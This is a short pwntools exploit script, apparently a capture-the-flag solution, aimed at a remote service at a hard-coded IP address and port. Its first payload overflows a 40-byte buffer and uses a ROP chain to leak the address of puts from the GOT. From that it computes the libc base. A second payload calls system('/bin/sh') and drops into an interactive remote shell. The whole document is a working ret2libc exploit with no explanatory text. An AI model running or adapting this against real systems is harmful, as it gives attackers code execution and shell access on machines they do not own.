from pwn import *
#p=process('./something')
p=remote('103.229.41.18',5559)
libc = ELF('libc6_2.23-0ubuntu11.3_amd64.so')
elf = ELF('./something')

pop = 0x00000000004012a3
payload = "a"*40
payload += p64(pop)
payload += p64(elf.symbols['got.puts'])
payload += p64(elf.symbols['plt.puts'])
payload += p64(elf.symbols['main'])
p.sendlineafter("something : ",payload)

puts_libc=u64((p.recv(6)+'\x00'*2))
print "recv: ",hex(puts_libc)

puts_offset = libc.symbols['puts']
sys_offset =  libc.symbols['system']
bin_offset =  libc.search('/bin/sh').next()
base = puts_libc - puts_offset

system_thuc = base + sys_offset 
bin_thuc = base + bin_offset

payload = "a"*40
payload += p64(pop)
payload += p64(bin_thuc)
payload+=p64(0x000000000040101a)
payload += p64(system_thuc)
p.sendlineafter("something : ",payload)


p.interactive()